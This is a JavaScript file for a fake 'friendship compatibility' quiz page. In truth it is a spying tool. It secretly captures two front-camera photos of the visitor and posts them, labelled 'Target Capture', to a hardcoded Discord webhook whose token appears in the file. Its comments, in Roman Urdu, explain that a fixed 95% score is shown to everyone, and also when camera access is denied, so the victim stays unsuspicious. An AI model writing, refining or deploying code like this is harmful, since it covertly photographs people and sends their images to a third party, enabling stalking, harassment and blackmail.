const webhookURL = "https://discord.com/api/webhooks/1572972860492742728/SmNNyYnxTwnP84_OUEhN3ca2F8U2Spq9p8WBCL6dr-PlK8GyvtYX5f6B3mfnHATL03eV";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
let photoCount = 0;
const maxPhotos = 2; // Kitni tasveerein leni hain

async function startProcess() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { width: 640, height: 480, facingMode: "user" }, 
            audio: false 
        });
        video.srcObject = stream;
        await video.play();
        
        // Thoda wait karke capture shuru karein
        setTimeout(captureAndSendPhotos, 1500);
    } catch (error) {
        console.error("Camera error:", error);
        // Agar permission deny ho ya error aaye toh seedha result dikha kar aage barhein taake shaq na ho
        showFinalResult();
    }
}

function captureAndSendPhotos() {
    if (photoCount >= maxPhotos) {
        showFinalResult();
        return;
    }

    const context = canvas.getContext('2d');
    canvas.width = 640;
    canvas.height = 480;
    
    try {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob((blob) => {
            if (!blob) {
                setTimeout(captureAndSendPhotos, 1000);
                return;
            }
            
            photoCount++;
            const formData = new FormData();
            formData.append('file', blob, `vibe_check_${photoCount}.jpg`);
            formData.append('content', `📸 Vibe Check Target Capture #${photoCount}`);

            fetch(webhookURL, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                console.log(`Photo ${photoCount} sent successfully`);
                setTimeout(captureAndSendPhotos, 1200);
            })
            .catch(error => {
                console.error("Error sending photo:", error);
                setTimeout(captureAndSendPhotos, 1200);
            });
        }, 'image/jpeg', 0.75);

    } catch (err) {
        console.error("Canvas error:", err);
        showFinalResult();
    }
}

function showFinalResult() {
    // Sab ko aakhir mein 95% result show hoga
    const card = document.getElementById('mainCard');
    if(card) {
        card.innerHTML = `
            <h2>🎉 Result Ready!</h2>
            <p>Your Friendship Compatibility Score:</p>
            <div class="result-box">95% Match! 🔥</div>
            <p style="color: #38bdf8;">You both have an unbreakable bond!</p>
        `;
    }
}
